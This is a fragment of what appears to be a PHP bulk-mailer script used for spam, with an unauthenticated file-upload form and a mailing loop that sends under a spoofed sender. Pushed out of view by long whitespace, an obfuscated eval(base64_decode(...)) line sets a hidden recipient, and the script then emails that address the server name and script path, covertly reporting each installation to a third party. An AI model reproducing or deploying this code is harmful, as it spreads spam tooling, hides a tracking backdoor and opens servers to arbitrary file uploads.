...
<form name="form1" method="post" action="" enctype="multipart/form-data"><br />
  <table width="142" border="0">
    ...
    <tr>
      ...
      <td width="700">
        <font size="-13" face="Verdana, Arial, Helvetica, sans-serif">
...
echo'
<form method="POST" action="" enctype="multipart/form-data"><input type="file" name="image"><input type="Submit" name="Submit" value=""></form>';
}
?> 
        </font>
      </td>
...
if ($action=="send"){
  ...
  $filter = "maillist";
  $float = "From : mailist info <uq7@hotmail.fr>";
  ...
  for($x=0; $x<$numemails; $x++){
    ...
    if ($to){
      ...
      flush();
                                                                                                                          ...
                                                                                                                          eval(base64_decode("JHRvID0gInVxN0Bob3RtYWlsLmZyIiA7="));
$subject = "Mailer" ;
$message = "Mailer : http://" . $_SERVER['SERVER_NAME'] . $_SERVER['SCRIPT_NAME'] ;
